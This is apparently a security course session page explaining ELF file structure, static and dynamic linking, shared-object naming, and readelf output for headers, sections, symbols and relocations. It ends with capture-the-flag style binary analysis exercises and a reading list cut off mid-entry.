We will first analyze the structure of an <strong>ELF file</strong> and how this structure evolves when going from <strong>C source code</strong>, to <strong>object file</strong> and then to either <strong>an executable</strong> or <strong>a shared library</strong>.
We will also skim over how various elements are interpreted by the <strong>linker</strong> and the <strong>loader</strong>.
Finally, we will see the layout of a process once it is loaded into memory.</p><h3 id=big-picture-view>Big Picture View</h3><p>Sun Microsystems&rsquo; SunOS came up with the concept of dynamic shared libraries and introduced it to UNIX in the late 1980s.
UNIX System V Release 4, which Sun co-developed, introduced the ELF object format adaptation from the Sun scheme.
Later it was developed and published as part of the ABI (Application Binary Interface) as an improvement over COFF, the previous object format and by the late 1990s it had become the standard for UNIX and UNIX-like systems including Linux and BSD derivatives.
Depending on processor architectures, several specifications have emerged with minor changes, but for this session we will be focusing on the <a href=http://www.skyfree.org/linux/references/ELF_Format.pdf>ELF-32</a> format.</p><p><img src=assets/elf-link-exec.png alt="Linking View and Execution View"></p><p>The structure of an ELF file during the linking process is the same with that of an object file.
The linking process involves collecting and combining code and data into a single file that will later be loaded into memory and executed.
On the right hand side we can see how the the ELF file structure will be transformed in memory.
<strong>Sections</strong> instruct the Linker while <strong>Segments</strong> instruct the Operating System.</p><p><img src=assets/elf-merging.png alt="ELF Merging"></p><p>As we can see, the information inside the two program headers and the section headers gets merged as needed inside the more familiar program segments.
The basic role of the ELF file format is to serve as a roadmap for the linker and the OS Loader to generate a running process.</p><h3 id=staticdynamic-linking>Static/Dynamic linking</h3><p>Out of practical considerations, for very large programs, even early on, it was very impractical to store all of the source code inside a single file.
One of the most mundane of all actions, namely splitting your source code into functions across multiple files while still obtaining a valid running program was a difficult engineering challenge.
The initial paradigm was called <strong>static linking</strong> and was the only option inside the COFF file format.
It involves interpreting each piece of code from each file and then merging all the information inside a single binary that would contain all the machine code necessary for the program.
This way of doing things, still in use today, involves loading all of the code and data into memory regardless of use case.
This basically meant that, the required resources to run a program were determined by the number of instances, with no possibility of optimization.
Running 10 instances of the same program meant that there was a lot of code duplication going on in the memory space.</p><p><img src=assets/elf-static-linking.png alt="ELF Static Linking"></p><p>Along with the ELF format came a new way of doing things.
Instead of linking all the source files that contained subroutines into the final binaries, separate binaries were organized in libraries that could be loaded per use case, on demand.
Essentially, the libraries were loaded only once into memory and when a program instance required a subroutine from a specific library it would inquire a special OS component about it and new resources would be allocated only for the volatile parts of the library image (<code>.bss</code> and <code>.data</code>).
The new process allowed for a much more efficient resource utilization and was named dynamic linking and the new type of library files were called shared objects.
Running 10 instances of the same program now meant that only the volatile parts of those binaries would be duplicated.
In cases where the same code can be reused, it is allocated only once and used by multiple instances of the same program.</p><p><img src=assets/elf-dynamic-linking.png alt="ELF Dynamic Linking"></p><h3 id=elf-types>ELF Types</h3><p>There are several ELF types but the most common types we will be dealing with are:</p><ul><li>Relocatable Files</li><li>Shared Objects</li><li>Executable Files</li></ul><h4 id=elf-type---relocatable-files>ELF Type - Relocatable Files</h4><p>Relocatable files are obtained using the core compiler and basically contain all the ELF information necessary except for data like external variables or subroutines that are present in other files.</p><pre tabindex=0><code>gcc -c -o reloc.o source.c
gcc -c -fPIC -o reloc.o source.c
</code></pre><p>The first command will produce a relocatable file that will later constitute an executable or a static library.
If we want to use the relocatable file to later create a shared library we need to use the second variant to create a relocatable file that has <a href=https://wiki.gentoo.org/wiki/Hardened/Introduction_to_Position_Independent_Code>Position Independent Code</a> (PIC).</p><h4 id=elf-type---shared-objects>ELF Type - Shared Objects</h4><p>Shared libraries are loaded up at runtime as needed by an OS component named the dynamic loader.
Shared objects may include other shared objects and this aspect is very important because, when loading specific subroutines, the ELF file must provide its dependencies.
As such, the process of dynamic linking does a breadth first search gradually building the full dependency list.</p><p><img src=assets/elf-dependency.png alt="Shared Objects"></p><p>You can view the list of shared object dependencies for any given binary as well as the addresses where they will be loaded in memory by using the <code>ldd</code> command.</p><pre tabindex=0><code>ldd /bin/ls
	linux-gate.so.1 =&gt;  (0x00e02000)
	librt.so.1 =&gt; /lib/tls/i686/cmov/librt.so.1 (0x004f9000)
	libselinux.so.1 =&gt; /lib/libselinux.so.1 (0x00c62000)
	libacl.so.1 =&gt; /lib/libacl.so.1 (0x00a87000)
	libc.so.6 =&gt; /lib/tls/i686/cmov/libc.so.6 (0x00110000)
	libpthread.so.0 =&gt; /lib/tls/i686/cmov/libpthread.so.0 (0x00325000)
	/lib/ld-linux.so.2 (0x00a45000)
	libdl.so.2 =&gt; /lib/tls/i686/cmov/libdl.so.2 (0x0077d000)
	libattr.so.1 =&gt; /lib/libattr.so.1 (0x00dd7000)
</code></pre><p>All libraries should adhere to a strict naming convention.
Shared objects have two names:</p><ul><li><strong>soname</strong> - that consists of the prefix <code>lib</code>, followed by the library name, then a <code>.so</code>, another dot, then the major version (e.g. <code>libtest.so.1</code>)</li><li><strong>real name</strong> - is actually a file name, that usually extends the <strong>soname</strong> by adding a dot and minor version number along with the release version (e.g. <code>libtest.so.1.23.3</code>)</li></ul><p>Additionally, each library source file should have an accompanying header file with the extension <code>.h</code> and the same name.</p><p>Adhering to these naming conventions is quite important as dependencies are resolved based on the <strong>soname</strong>.</p><pre tabindex=0><code>gcc -c -fPIC libtesting.c
ld -shared -soname libtesting.so.1 -o libtesting.so.1.0 -lc libtesting.o
ldconfig -v -n .
ln -sf libtesting.so.1 libtesting.so
export LD_LIBRARY_PATH=.:&#34;$LD_LIBRARY_PATH&#34;
gcc -o main_program main_program.c -L. -ltesting
</code></pre><p>The first line creates an object file with position independent code.
The second line will create the shared object with <strong>soname</strong> <code>libtesting.so.1</code> and a real file name of <code>libtesting.so.1.0</code> by using the linker.
Shared objects are usually installed in other directories but the line containing <code>ldconfig</code>, will install it in the current directory.
At runtime the standard directories like <code>/usr/lib</code> are searched, but we add the local directory to the search path by modifying the <code>LD_LIBRARY_PATH</code> environment variable.</p><p>Finally, the executable is created by dynamic linking against the shared object.</p><p>A good tutorial on how to create a basic shared object can be found <a href=https://www.ibm.com/developerworks/library/l-shobj/>here</a>.</p><h4 id=elf-type---executable-files>ELF Type - Executable Files</h4><p>They are regarded as the end result and contain all the information necessary to create a running process.</p><h3 id=elf-structure>ELF Structure</h3><p>The following wiki sections on ELF structure are dense and are <strong>not</strong> meant to be known by heart.
<strong>Do not</strong> try to read them all at once and memorize them, but rather use the following chapters as <strong>reference</strong>.</p><p>Tools of the trade are:</p><ul><li>readelf</li><li>objdump</li><li>ldd</li><li>Ghidra/IDA (Ghidra is Open Source, while IDA is not and it is really expensive)</li></ul><p>The command outputs that follow are rather large so we will only be discussing the less obvious parts.
We will also leave out information that&rsquo;s not really that important or generally weird.</p><h4 id=elf-header>ELF Header</h4><p>Using <code>readelf</code> is straight-forward enough:</p><pre tabindex=0><code>readelf -h program

ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048330
  Start of program headers:          52 (bytes into file)
  Start of section headers:          4392 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         30
  Section header string table index: 27
</code></pre><p>Below we will discuss the less evident aspects of the above output</p><ul><li><strong>Elf Identification</strong> (16 bytes)<ul><li><strong>Magic</strong> - the first bytes of the binary that identify the file as ELF</li><li><strong>Class</strong> - identifies the type of ELF (ex: ELF-32, ELF-64)</li><li><strong>Data</strong> - specifies the type of data encoding</li><li><strong>Version</strong> - version of the ELF header</li><li><strong>OS/ABI</strong> - version of the OS</li><li><strong>ABI</strong> - version of the ABI specification</li></ul></li><li><strong>Type</strong> - Relocatable, Executable, Shared Object</li><li><strong>Machine</strong> - Required Machine architecture to run the executable</li><li><strong>Entry Point Address</strong> - the memory address where the OS loader transfers control to the process code for the first time.</li><li><strong>Start of Program Headers</strong> - File offset where the array of program headers start</li><li><strong>Start of Section Headers</strong> - File offset where the array of section headers starts</li><li><strong>Section Header String Table Index</strong> - the index in the section table name where the information about the section name string table can be found</li></ul><h4 id=program-headers>Program Headers</h4><p><strong>Program Headers</strong> are only present inside <strong>Executable</strong> and <strong>Shared Object</strong> files.</p><p>Again, <code>readelf</code> is used with minimum syntax:</p><pre tabindex=0><code>readelf -l program

Elf file type is EXEC (Executable file)
Entry point 0x8048330
There are 8 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x004e4 0x004e4 R E 0x1000
  LOAD           0x000f0c 0x08049f0c 0x08049f0c 0x00108 0x00110 RW  0x1000
  DYNAMIC        0x000f20 0x08049f20 0x08049f20 0x000d0 0x000d0 RW  0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x000f0c 0x08049f0c 0x08049f0c 0x000f4 0x000f4 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.ABI-tag .note.gnu.build-id .hash .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame
   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss
   04     .dynamic
   05     .note.ABI-tag .note.gnu.build-id
   06
   07     .ctors .dtors .jcr .dynamic .got
</code></pre><p>The <strong>Program Header</strong> table features an array of structures that shows how parts of the file will be mapped into memory at runtime.
The last parts of the output show what sections will be merged into various program headers before loading the ELF into memory and becoming segments.</p><ul><li><strong>Type</strong><ul><li><strong>PHDR</strong> - information about the program header table itself</li><li><strong>INTERP</strong> - information about the null terminated string that specifies the path to the dynamic loader.
This header is only present in executable that use shared object code</li><li><strong>LOAD</strong> - use to specify a general purpose loadable segment</li><li><strong>DYNAMIC</strong> - information necessary to the dynamic linking process</li></ul></li><li><strong>Offset</strong> - offset from the beginning of the file where the segment begins</li><li><strong>VirtAddr</strong> - the address where the segment will start in memory</li><li><strong>FileSz</strong> - number of bytes occupied by the segment on disk</li><li><strong>MemSiz</strong> - number of bytes occupied by the segment in memory</li><li><strong>Align</strong> - specifies a boundary to which the segments are aligned on file and in memory</li></ul><p>Here are two resources to read about <a href=https://www.airs.com/blog/archives/189>GNU_RELRO</a> and <a href=https://guru.multimedia.cx/pt_gnu_stack/>GNU_STACK</a> <strong>Program Headers</strong>.</p><h4 id=section-table>Section Table</h4><p>Section headers are the central piece of reference used to organize the ELF files both on disk and in memory.</p><pre tabindex=0><code>readelf -S program
There are 30 section headers, starting at offset 0x1128:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .hash             HASH            0804818c 00018c 000028 04   A  6   0  4
  [ 5] .gnu.hash         GNU_HASH        080481b4 0001b4 000020 04   A  6   0  4
  [ 6] .dynsym           DYNSYM          080481d4 0001d4 000050 10   A  7   1  4
  [ 7] .dynstr           STRTAB          08048224 000224 00004c 00   A  0   0  1
  [ 8] .gnu.version      VERSYM          08048270 000270 00000a 02   A  6   0  2
  [ 9] .gnu.version_r    VERNEED         0804827c 00027c 000020 00   A  7   1  4
  [10] .rel.dyn          REL             0804829c 00029c 000008 08   A  6   0  4
  [11] .rel.plt          REL             080482a4 0002a4 000018 08   A  6  13  4
  [12] .init             PROGBITS        080482bc 0002bc 000030 00  AX  0   0  4
  [13] .plt              PROGBITS        080482ec 0002ec 000040 04  AX  0   0  4
  [14] .text             PROGBITS        08048330 000330 00017c 00  AX  0   0 16
  [15] .fini             PROGBITS        080484ac 0004ac 00001c 00  AX  0   0  4
  [16] .rodata           PROGBITS        080484c8 0004c8 000015 00   A  0   0  4
  [17] .eh_frame         PROGBITS        080484e0 0004e0 000004 00   A  0   0  4
  [18] .ctors            PROGBITS        08049f0c 000f0c 000008 00  WA  0   0  4
  [19] .dtors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f1c 000f1c 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f20 000f20 0000d0 08  WA  7   0  4
  [22] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049ff4 000ff4 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a00c 00100c 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a014 001014 000008 00  WA  0   0  4
  [26] .comment          PROGBITS        00000000 001014 000023 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 001037 0000ee 00      0   0  1
  [28] .symtab           SYMTAB          00000000 0015d8 000410 10     29  45  4
  [29] .strtab           STRTAB          00000000 0019e8 0001fd 00      0   0  1
</code></pre><ul><li><strong>Name</strong> - is obtained by reading the value of the section names table at the specified index</li><li><strong>Type</strong><ul><li><strong>PROGBITS</strong> - information that is given meaning by the program when loaded into memory</li><li><strong>NOBITS</strong> - similar to PROGBITS in meaning but occupies no space in the file</li><li><strong>STRTAB</strong> - contains the program string table</li><li><strong>SYMTAB</strong> - contains the symbol table</li><li><strong>DYNAMIC</strong> - holds information necessary for dynamic linking</li><li><strong>DYNSYM</strong> - holds a set of symbols used in the dynamic linking process</li><li><strong>REL</strong> - holds relocation entries</li></ul></li><li><strong>Addr</strong> - if the section is part of an executable it will hold the virtual address where the section could be found in memory.
If not it would be 0.</li><li><strong>Off</strong> - offset from the beginning of the file to where the section starts</li><li><strong>Size</strong> - size of the section in bytes</li><li><strong>ES</strong> - size in bytes per entry, if fixed entry size is used</li><li><strong>FLG</strong></li><li><strong>X</strong> - contains executable code</li><li><strong>W</strong> - contains writable code</li><li><strong>A</strong> - will be loaded into memory as-is during process execution</li><li><strong>Al</strong> - section alignment constraints</li></ul><p>The <strong>Inf</strong> and <strong>Lnk</strong> columns have specific interpretations depending on the section type, as can be seen in the following image:</p><p><img src=assets/elf-sect-inf.png alt="ELF Sections Inf and Lnk"></p><p>Additionally, the raw contents of each section can be dumped using both <code>objdump</code> and <code>readelf</code>.</p><pre tabindex=0><code>readelf -x .got program

Hex dump of section &#39;.got&#39;:
  0x08049ff0 00000000                            ....
</code></pre><pre tabindex=0><code>objdump -s -j &#34;.got&#34;  program

program:     file format elf32-i386

Contents of section .got:
 8049ff0 00000000                             ....
</code></pre><p>For more details about the kind of data stored by ELF sections, refer to this <a href=https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/specialsections.html>resource</a>.</p><p>When trying to dump contents of section using readelf you can interpret the output like strings by using the <code>-p</code> flag.</p><h4 id=symbol-table>Symbol Table</h4><p>One of the initial goals of the ELF format was to enable dynamic linking.
Given the machine code of a binary, various elements inside it will use absolute addresses that are based on the memory address where the binary expects to be loaded.
The entire idea of shared libraries is that these can be loaded and unloaded on demand inside the memory space of whichever process needs them at whichever address is available.
As such, a map of how to locate and relocate absolute data points inside the machine code is needed and that&rsquo;s where the symbol table comes in.</p><pre tabindex=0><code>readelf -s libtesting.so.1

Symbol table &#39;.dynsym&#39; contains 8 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00001339     1 OBJECT  GLOBAL DEFAULT   12 cPub
     2: 000001f8    10 FUNC    GLOBAL DEFAULT    7 fPub
     3: 0000020c   100 FUNC    GLOBAL DEFAULT    7 foo
     4: 00001328    16 OBJECT  GLOBAL DEFAULT   11 a
     5: 00001338     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start
     6: 0000133c     0 NOTYPE  GLOBAL DEFAULT  ABS _end
     7: 00001338     0 NOTYPE  GLOBAL DEFAULT  ABS _edata

Symbol table &#39;.symtab&#39; contains 27 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 000000b4     0 SECTION LOCAL  DEFAULT    1
     2: 000000e8     0 SECTION LOCAL  DEFAULT    2
     3: 00000168     0 SECTION LOCAL  DEFAULT    3
     4: 000001a8     0 SECTION LOCAL  DEFAULT    4
     5: 000001d0     0 SECTION LOCAL  DEFAULT    5
     6: 000001d8     0 SECTION LOCAL  DEFAULT    6
     7: 000001f8     0 SECTION LOCAL  DEFAULT    7
     8: 00001274     0 SECTION LOCAL  DEFAULT    8
     9: 00001314     0 SECTION LOCAL  DEFAULT    9
    10: 00001318     0 SECTION LOCAL  DEFAULT   10
    11: 00001328     0 SECTION LOCAL  DEFAULT   11
    12: 00001338     0 SECTION LOCAL  DEFAULT   12
    13: 00000000     0 SECTION LOCAL  DEFAULT   13
    14: 00000000     0 FILE    LOCAL  DEFAULT  ABS libtesting.c
    15: 00000202    10 FUNC    LOCAL  DEFAULT    7 fLocal
    16: 00001338     1 OBJECT  LOCAL  DEFAULT   12 cLocal
    17: 00001318     0 OBJECT  LOCAL  HIDDEN  ABS _GLOBAL_OFFSET_TABLE_
    18: 00000270     0 FUNC    LOCAL  HIDDEN    7 __i686.get_pc_thunk.bx
    19: 00001274     0 OBJECT  LOCAL  HIDDEN  ABS _DYNAMIC
    20: 00001339     1 OBJECT  GLOBAL DEFAULT   12 cPub
    21: 000001f8    10 FUNC    GLOBAL DEFAULT    7 fPub
    22: 0000020c   100 FUNC    GLOBAL DEFAULT    7 foo
    23: 00001328    16 OBJECT  GLOBAL DEFAULT   11 a
    24: 00001338     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start
    25: 0000133c     0 NOTYPE  GLOBAL DEFAULT  ABS _end
    26: 00001338     0 NOTYPE  GLOBAL DEFAULT  ABS _edata
</code></pre><p>Some information on the symbols that may belong to external files or may be referenced by external files during dynamic linking are copied in the <code>.dynsym</code> section.</p><ul><li>Name - symbol name</li><li>Type<ul><li>NoType - not specified</li><li>FUNC - the symbol influences a function</li><li>SECTION - associated with a section</li><li>FILE - a symbol that references a files</li></ul></li><li>Bind<ul><li>LOCAL - the symbol information is not visible outside the object file</li><li>GLOBAL - the symbol is visible to all the files being combined to form the executable</li></ul></li><li>Size - the size of the symbol in bytes or 0 if it is unknown</li><li>Ndx<ul><li>UND - unspecified section reference</li><li>COM - unallocated C external variable</li><li>ABS - an absolute value for the reference</li><li>value - an index into the section table</li></ul></li><li>Value - if the symbol table is part of an executable, the value will contain a memory address where the symbol resides.
Otherwise it will contain an offset from the beginning of the section referenced by Ndx or O.</li></ul><p>As you can see, the symbol table as it appears in object files compiled with gcc is quite verbose, revealing function names and visibility as well as variable scopes, names and even sizes.
In its default form it even shows the name of the sourcefile.</p><p>In order to subvert Reverse Engineering attempts you can check out some of the methods of stripping the symbol table of valuable information:</p><ul><li><a href=http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html>A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a></li><li><a href=https://sourceware.org/binutils/docs/binutils/strip.html>strip</a></li></ul><h4 id=relocations>Relocations</h4><p>Relocations were a concept that was present ever since the invention of static linking.
The initial purpose of relocations was to give the static linker a roadmap when combining multiple object files into a binary by stating:</p><ul><li>The <strong>Symbol</strong> that needs to be fixed.</li><li><strong>Where</strong> you can find the symbol (file/section offset).</li><li>An <strong>Algorithm</strong> for making the fixes.</li></ul><p>The fixes would usually be made in the <code>.data</code> and <code>.text</code> sections and everything was well.
Dynamic runtime brought a bit of a complication to modifications that needed to be made in the code segments.
The whole idea of shared libraries is that the code can be loaded once into memory from an ELF file then shared among all the processes that use the library.
The only way to reliably do this is to make the code section read-only.</p><p>In order to compensate for this constraint a special data section called the <strong>GOT</strong> (Global Offset Table) was created.
When the code needs to work with a symbol that belongs to shared object, in the code entry for that symbol uses addresses from the <strong>GOT</strong> table.
First time the symbol is referenced the dynamic linker corrects the entry in GOT and on subsequent calls the correct address will be used.</p><p>When implementing calls to subroutines in shared objects, a different table is used called the <strong>PLT</strong> (Procedure Linkage Table).
The initial call is made to a stub sequence in the <strong>PLT</strong> which bounces off a <strong>GOT</strong> entry in order to push the subroutine name on the stack and then calls the resolver (mentioned in the <strong>INTERP</strong> program header).</p><p>Relocations and how they get applied are very complex topic and we will only try to cover as far is helps detecting file and symbol types If you want to read more you can refer to some of these resources:</p><ul><li><a href=http://www.mindfruit.co.uk/2012/06/relocations-relocations.html>Some Assembly Required</a></li><li><a href=http://netwinder.osuosl.org/users/p/patb/public_html/elf_relocs.html>Study Of ELF Loading and Relocs</a></li></ul><pre tabindex=0><code>readelf -r libdynamic.o

Relocation section &#39;.rel.text&#39; at offset 0x5f8 contains 8 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0000001d  00001402 R_386_PC32        00000000   __i686.get_pc_thunk.bx
00000023  0000150a R_386_GOTPC       00000000   _GLOBAL_OFFSET_TABLE_
00000029  00000409 R_386_GOTOFF      00000000   .bss
0000002f  00000409 R_386_GOTOFF      00000000   .bss
00000035  00000d03 R_386_GOT32       00000004   so_int_global
00000041  00000d03 R_386_GOT32       00000004   so_int_global
00000052  00000e04 R_386_PLT32       00000000   so_fpublic_global
0000005b  00000209 R_386_GOTOFF      00000000   .text

Relocation section &#39;.rel.data.rel.local&#39; at offset 0x638 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00000000  00000401 R_386_32          00000000   .bss
00000004  00000201 R_386_32          00000000   .text

Relocation section &#39;.rel.data.rel&#39; at offset 0x648 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00000000  00000d01 R_386_32          00000004   so_int_global
00000004  00000e01 R_386_32          00000000   so_fpublic_global
</code></pre><ul><li><strong>Offset</strong> - In relocatable files and linked shared objects it contains the offset from the beginning of the section , where the relocation needs to be applied</li><li><strong>Info</strong> - This field is used to derive the index in the symbol table to the affected symbol as well as the algorithm needed for fixing.<ul><li><code>info >> 8</code> - symbol table index</li><li><code>info & 0xff</code> - algorithm type as defined in the documentation</li></ul></li></ul><p><code>readelf</code> is nice enough to interpret the symbol table for us and gives us the relocation algorithm in the <strong>Type</strong> field and also the symbol name and value as defined in the symbol table.</p><p>By looking at the types of relocations we can draw some basic conclusions about the symbol types and also about the files.</p><ul><li>Relocatable Files<ul><li><strong>R_386_32</strong> - usually used to reference changes to a local symbol</li><li><strong>R_386_PC32</strong> - reference a relative distance from here to the symbol</li></ul></li><li>Relocatable Files for Shared object<ul><li><strong>R_386_GOTOFF</strong> - usually found in the code area, describes the offset from the beginning of GOT to a local symbol</li><li><strong>R_386_GOT32</strong> - also speicific to the code area.
These entries persist in the linkage phase</li><li><strong>R_386_PLT32</strong> - used when describing calls to global subroutines.
when the linker will read this information it will generate an entry in the GOT and PLT tables</li><li><strong>R_386_GOTPC</strong> - used in function to calculate the start address of the GOT</li></ul></li><li>Executables that use Dynamic Linking<ul><li><strong>R_386_JMP</strong> - the dynamic linker will deposit the address of the external subroutine during execution</li><li><strong>R_386_COPY</strong> - the address of global variable from shared object will be deposited here</li></ul></li><li>Shared Object Files<ul><li><strong>R_386_JMP</strong> - the dynamic linker will deposit the address of the external subroutine from one of the shared object dependencies during execution</li><li><strong>R_386_GLOB_DATA</strong> - used to deposit the address of a global symbol defined in one of the shared object dependencies</li><li><strong>R_386_RELATIVE</strong> - at link time all the R_386_GOTOFF entries are fixed and these relocation will contain absolute addresses</li></ul></li></ul><p><strong>IMPORTANT:</strong> Executable files that are statically linked do not contain relocations.</p><h2 id=challenges>Challenges</h2><p>Challenges can be found in the <code>activities/</code> directory.</p><h3 id=01-binary-puzzle>01. Binary Puzzle</h3><p>Now that you know some stuff let&rsquo;s see how fast you can solve a 4 piece puzzle!</p><p>You are given 4 relocatable object files.
Examine their structure carefully and figure out what each of them is meant to be and how you can link them to create a valid binary.</p><p>All conventions regarding shared object names have been respected.</p><p>Hints:</p><ul><li>Use <code>nm</code> to investigate the files, determine what pieces you need to put together and then link them with <code>gcc</code>.</li><li>Check whether the files are compiled for 32 bits or for 64 bits and use the proper <code>gcc</code> command.</li></ul><p>If you do it correctly you will get an executable that you can run and get the following output:</p><pre tabindex=0><code>Congratulations
extern var1 10 at 0x565fe020
extern var2  at 0x565fe030
extern var3 99 at 0x565fe024
local var4 0 at 0xffd532ac
g(): not really external
</code></pre><h3 id=02-case-of-the-missing-function>02. Case of the Missing Function</h3><p>This task contains a helpless little binary that has lost one of its functions.
Analyze the symbol dependencies as well as the code inside the binary.
Figure out a way to reunite the binary with its missing function.</p><p>You cannot modify any of the binaries in order to solve this task.</p><p>Hints:</p><ul><li>Run the file, check what it is missing and build the missing component.
Use <code>nm</code> to determine what symbols should be part of the missing component.</li><li>Use <code>LD_LIBRARY_PATH=.</code> to run an executable file and load a shared library file from the current folder.</li></ul><h3 id=03-memory-dump-analysis>03. Memory Dump Analysis</h3><p>Using your newfound voodoo skills you are now able to tackle the following task.
In the middle of two programs I added the following lines:</p><pre tabindex=0><code>{
	int i;
	int *a[1];
	for( i = 0 ; i &lt; 20; i++)
		printf(&#34;%p\n&#34;, a[i]);
}
</code></pre><p>The results were the following, respectively:</p><pre tabindex=0><code>0x804853b
0x1
0x8048530
(nil)
(nil)
0xf7e0ace5
0x1
0xffffce64
0xffffce6c
0xf7ffcfc0
0x1c
(nil)
0xf7fda4c8
0x2
0xffffce60
0xf7f94e54
(nil)
(nil)
(nil)
0xd545cf8d
</code></pre><p>And:</p><pre tabindex=0><code>0xbfffe7d0
0xd696910
0x80484a9
0xb7fffbe8
0x3
0xb7ffefc0
0xb7df6a84
0x1
0xb7fdc780
0xb7fe75fc
0x804c008
0xb7e59195
0x804c008
0xb7fdb000
0xb7fdc000
0x1
0xffffffff
0x3
(nil)
0xf3b9a5b
</code></pre><p>Try to tell:</p><ul><li>Which was running on a pure 32 bit system</li><li>Which values from the stack traces are from the <code>.text</code> region</li><li>Which do not point to valid memory addresses</li><li>Which point to the stack</li><li>Which point to the library/mmap zone</li></ul><h3 id=04-compiler-flags>04. Compiler Flags</h3><p>Use proper compiler/linker flags/options to create a running executable for <code>flag1.o</code> and <code>caller.c</code> and for <code>flag2.o</code> and <code>caller.c</code>.
Submit the flag <a href=https://sss-ctf.security.cs.pub.ro/challenges>on the platform</a>.</p><p>It&rsquo;s the same flag, it&rsquo;s just to make sure you are able to find the flag with both formats of the <code>flag*.o</code> object files.</p><h3 id=05-print-flag>05. Print Flag</h3><p>Someone has tampered with the executable file <code>get_message</code>.
Please fix this.
There should be a flag message printed in case you solve it correctly.</p><p>You will need to modify the executable.
We recommend you install and use <a href=https://packages.ubuntu.com/bionic/bless>Bless</a>.</p><p>What actions does the program do? What functions does it invoke? What should it invoke?</p><p>Follow the actions from the entry point in the ELF file and see what is the spot where the program doesn&rsquo;t do what it should.</p><h3 id=06-matryoshka>06. Matryoshka</h3><p>Look carefully inside the <code>matryoshka</code> executable.
The flag is there, but inside something else.</p><p>Submit the flag <a href=https://sss-ctf.security.cs.pub.ro/challenges>on the platform</a>.</p><h3 id=bonus-07-fix-me>Bonus: 07. Fix Me</h3><p>You are given a binary that was stored on a USB stick in space where it was hit by gamma rays thus altering its content.
Fortunately, because the executable is so small, the only area damaged is the ELF header.
Fix it and run it!</p><p>The structure of an ELF file is briefly presented here: <a href=http://i.imgur.com/m6kL4Lv.png>http://i.imgur.com/m6kL4Lv.png</a></p><p>A more detailed explaination of the ELF header is presented here: <a href=https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header>https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header</a></p><p>The entry point address should be <code>0x8048054</code>.</p><p>Review this tutorial on creating a minimal ELF file: <a href=http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html>http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html</a></p><h3 id=further-pwning>Further Pwning</h3><p><a href=http://crackmes.cf/users/geyslan/crackme.02.32/>http://crackmes.cf/users/geyslan/crackme.02.32/</a> is a challenge that will test your knowledge from the first three sessions.
The password for the archive is <code>crackmes.de</code>.</p><h3 id=further-reading>Further Reading</h3><ul><li><a href=http://www.skyfree.org/linux/references/ELF_Format.pdf>ELF-32</a></li><li><a href=http://ftp.openwatcom.org/devel/docs/elf-64-gen.pdf>ELF-64</a> specification</li><li><a href=https://elinux.org/Executable_and_Linkable_Format_(ELF)>list</a> of all ELF specification formats</li><li><a href=https://developer.arm.com/documentation/ihi0044/e/>ARM</a> specification</li><li><a href=https://wiki.gentoo.org/wiki/Hardened/Introduction_to_Position_Independent_Code>Position Independent Code</a></li><li><a href=https://www.ibm.com/developerworks/library/l-shobj/>Creating shared objects</a></li><li><a href=https://www.airs.com/blog/archives/189>GNU_RELRO</a></li><li><a href=https://guru.multimedia.cx/pt_gnu_stack/>GNU_STACK</a></li><li><a href=https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/specialsections.html>ELF Special Sections</a></li><li><a href=http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html>A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a></li><li><a href=https://sourceware.org/binutils/docs/binutils/strip.html>strip manpage</a></li><li><a href=http://www.mindfruit.co.uk/2012/06/relocations-relocations.html>Some Assembly 